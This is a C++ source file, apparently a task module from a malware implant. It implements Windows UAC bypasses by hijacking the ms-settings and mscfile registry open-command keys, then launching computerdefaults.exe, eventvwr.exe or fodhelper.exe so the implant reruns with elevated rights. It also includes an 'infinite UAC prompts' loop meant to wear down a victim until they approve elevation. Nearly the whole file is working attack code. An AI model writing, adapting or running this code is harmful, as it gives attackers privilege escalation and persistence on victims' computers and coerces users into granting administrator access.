#include "core/task.hpp"

namespace Task
{
    std::wstring Uac(State::PSTATE pState, const std::wstring& wTechnique)
    {
        // Get current program (implant) path.
        WCHAR wSelfPath[MAX_PATH];
        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
        if (dwResult == 0)
        {
            return L"Error: Failed to get the program path.";
        }
        LPCWSTR lpSelfPath = wSelfPath;

        HKEY hKey;
        DWORD d;

        if (wcscmp(wTechnique.c_str(), L"computerdefaults") == 0)
        {
            // Reference: https://github.com/blue0x1/uac-bypass-oneliners
            std::wstring wSubKey = L"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command";

            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /ve /t REG_SZ /d "cmd /c start ..."
            std::wstring wCmd = std::wstring(wSelfPath);
            LPCWSTR lpCmd = wCmd.c_str();
            if (!System::Registry::RegAdd(
                pState->pProcs,
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                L"",
                REG_SZ,
                (BYTE*)lpCmd,
                (wcslen(lpCmd) + 1) * sizeof(WCHAR)
            )) {
                return L"Error: Failed to add registry value for HKCU\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command.";
            }

            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /v DelegateExecute /t REG_SZ /d ""
            const WCHAR* wDel = L"";
            if (!System::Registry::RegAdd(
                pState->pProcs,
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                L"DelegateExecute",
                REG_SZ,
                (BYTE*)wDel,
                (wcslen(wDel) + 1) * sizeof(WCHAR)
            )) {
                return L"Error: Failed to add registry value for DeletegateExecute.";
            }

            // Start the computerdefaults.exe
            SHELLEXECUTEINFO sei = {sizeof(sei)};
            sei.lpVerb = L"runas";
            sei.lpFile = L"C:\\Windows\\System32\\computerdefaults.exe";
            sei.hwnd = nullptr;
            sei.nShow = SW_NORMAL;

            if (!pState->pProcs->lpShellExecuteExW(&sei))
            {
                return L"Error: Failed to execute computerdefaults.exe.";
            }

            return L"Success: The computerdefaults and another process started successfully.";
        }
        else if (wcscmp(wTechnique.c_str(), L"eventvwr") == 0)
        {
            // Reference: https://github.com/blue0x1/uac-bypass-oneliners
            std::wstring wSubKey = L"SOFTWARE\\Classes\\mscfile\\Shell\\Open\\Command";

            // reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start ..."
            std::wstring wCmd = std::wstring(wSelfPath);
            LPCWSTR lpCmd = wCmd.c_str();
            if (!System::Registry::RegAdd(
                pState->pProcs,
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                L"",
                REG_SZ,
                (BYTE*)lpCmd,
                (wcslen(lpCmd) + 1) * sizeof(WCHAR)
            )) {
                return L"Error: Failed to add registry value for HKCU\\SOFTWARE\\Classes\\mscfile\\Shell\\Open\\Command.";
            }

            // reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d ""
            const WCHAR* wDel = L"";
            if (!System::Registry::RegAdd(
                pState->pProcs,
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                L"DelegateExecute",
                REG_SZ,
                (BYTE*)wDel,
                (wcslen(wDel) + 1) * sizeof(WCHAR)
            )) {
                return L"Error: Failed to add registry value for DelegateExecute";
            }

            // Start the eventvwr.exe
            SHELLEXECUTEINFO sei = {sizeof(sei)};
            sei.lpVerb = L"runas";
            sei.lpFile = L"C:\\Windows\\System32\\eventvwr.exe";
            sei.hwnd = nullptr;
            sei.nShow = SW_NORMAL;

            if (!pState->pProcs->lpShellExecuteExW(&sei))
            {
                return L"Error: Failed to execute eventvwr.exe.";
            }

            return L"Success: The eventvwr and another process started successfully.";
        }
        else if (wcscmp(wTechnique.c_str(), L"fodhelper") == 0)
        {
            // Reference: https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html
            std::wstring wSubKey = L"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command";

            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /ve /t REG_SZ /d "cmd /c start ..."
            std::wstring wCmd = std::wstring(wSelfPath);
            LPCWSTR lpCmd = wCmd.c_str();
            if (!System::Registry::RegAdd(
                pState->pProcs,
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                L"",
                REG_SZ,
                (BYTE*)lpCmd,
                (wcslen(lpCmd) + 1) * sizeof(WCHAR)
            )) {
                return L"Error: Failed to add registry value for HKCU\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\Command.";
            }

            // reg add "HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\Command" /v DelegateExecute /t REG_SZ /d ""
            const WCHAR* wDel = L"";
            if (!System::Registry::RegAdd(
                pState->pProcs,
                HKEY_CURRENT_USER,
                wSubKey.c_str(),
                L"DelegateExecute",
                REG_SZ,
                (BYTE*)wDel,
                (wcslen(wDel) + 1) * sizeof(WCHAR)
            )) {
                return L"Error: Failed to add registry value for DeletegateExecute.";
            }

            // Start the fodhelper.exe
            SHELLEXECUTEINFO sei = {sizeof(sei)};
            sei.lpVerb = L"runas";
            sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
            sei.hwnd = nullptr;
            sei.nShow = SW_NORMAL;

            if (!pState->pProcs->lpShellExecuteExW(&sei))
            {
                return L"Error: Failed to execute fodhelper.exe.";
            }

            return L"Success: The fodhelper and another process started successfully.";
        }
        else if (wcscmp(wTechnique.c_str(), L"infinite-uac-prompts") == 0)
        {
            // Reference: https://any.run/cybersecurity-blog/windows11-uac-bypass/
            while (TRUE)
            {
                std::wstring wParams = L"/c " + std::wstring(wSelfPath) + L" && pause";

                SHELLEXECUTEINFO sei = {sizeof(sei)};
                sei.lpVerb = L"runas";
                sei.lpFile = L"cmd.exe";
                sei.lpParameters = wParams.c_str();
                // sei.hwnd = nullptr;
                sei.nShow = SW_HIDE;

                if (pState->pProcs->lpShellExecuteExW(&sei))
                {
                    return L"Success: The inifinite UAC prompts is executed.";
                }
                // If the victim unaccept the UAC prompt, infinite loop until it's accepted...
            }

            return L"Success: The inifinite UAC prompts is executed.";
        }

        return L"Error: Invalid technique.";
    }
}